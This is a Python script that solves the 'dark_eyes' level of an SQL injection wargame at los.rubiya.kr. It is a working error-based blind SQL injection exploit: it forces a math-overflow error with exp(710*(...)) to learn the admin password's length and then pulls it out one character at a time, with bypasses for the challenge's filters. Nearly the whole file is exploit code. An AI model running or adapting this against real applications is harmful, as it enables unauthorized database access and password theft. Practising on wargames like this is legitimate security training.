#!/usr/bin/py
#-*-coding:utf-8 -*-

import requests

def GetPwLength(t, s):
  MIN_LENGTH = 1
  MAX_LENGTH = 100
  i = MIN_LENGTH

  while i <= MAX_LENGTH:
    try:
      tmpPwLength = str(i)
      payload = t + "?pw=' or id='admin' and exp(710*(select length(pw)=" + tmpPwLength + "))%23"
      r = requests.post(payload, cookies=(dict(PHPSESSID=s)))

    except OSError as e:
      continue

    except Exception as e:
      print("GetPwLength() Error...")
      print(e)
      exit(1)

    if "query" not in r.text:
      return i
    
    i += 1

def GetPw(t, s, lengthPw):
  FIRST_ASCII = 48
  LAST_ASCII = 127
  BACK_SLASH = 92
  tmpPw = ""

  for i in range(1, lengthPw + 1):
    j = FIRST_ASCII
    while j <= LAST_ASCII:
      try:
        # backslash error bypass
        if j == BACK_SLASH:
          j += 1

        tmpChar = chr(j)
        payload = t + "?pw=' or id='admin' and exp(710*(substr(pw, " + str(i) + ", 1)=binary(\'" + tmpChar + "\')))%23"
        r = requests.post(payload, cookies=(dict(PHPSESSID=s)))

      # Caused by NewConnectionError('<urllib3.connection.VerifiedHTTPSConnection object at 0x7f9f58e66910>: Failed to establish a new connection: [Errno 110] Connection timed out'))
      except OSError as e:
        continue

      except Exception as e:
        print("GetPw Error...")
        print(e)
        exit(1)

      # ascii code 0d95 "_" => "Hack" bypass
      if "query" not in r.text and "Hack" not in r.text:
        tmpPw += chr(j)
        print("Stolen Pw : %s" %(tmpPw))
        break

      j += 1
      
  return tmpPw

if __name__ == "__main__":
  t = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
  session = "" # Session
  pw = ""

  lengthPw = GetPwLength(t, session)
  print("Length of Pw : %d\n" %(lengthPw))

  pw = GetPw(t, session, lengthPw)
  print("Final Pw : %s" %(pw))